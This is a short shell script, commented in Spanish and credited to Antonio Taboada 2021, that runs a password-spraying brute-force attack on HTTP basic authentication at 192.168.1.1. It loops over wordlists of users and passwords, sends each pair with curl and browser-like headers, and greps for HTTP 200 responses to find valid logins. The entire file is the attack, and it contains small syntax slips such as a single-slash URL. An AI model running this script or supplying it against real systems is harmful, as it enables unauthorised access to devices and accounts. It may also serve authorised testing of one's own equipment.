#!/bin/sh
# Simple script de ataque fuerza bruta password spraying a http con autenticacion basica - Antonio Taboada 2021
for clave in `cat claves.txt`; do echo
for usuario in `cat usuarios.txt`; do credencial=$(printf "%s:%s" "$usuario" "$clave") ; echo $credencial
        curl -k -I --silent "https:/$credencial@192.168.1.1/?" \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
-H 'Sec-Fetch-Site: none' \
-H 'Sec-Fetch-Mode: navigate' \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Accept-Language: es-ES,es;q=0.9,en;q=0.8' \ |grep 200
echo "=============="
done
done
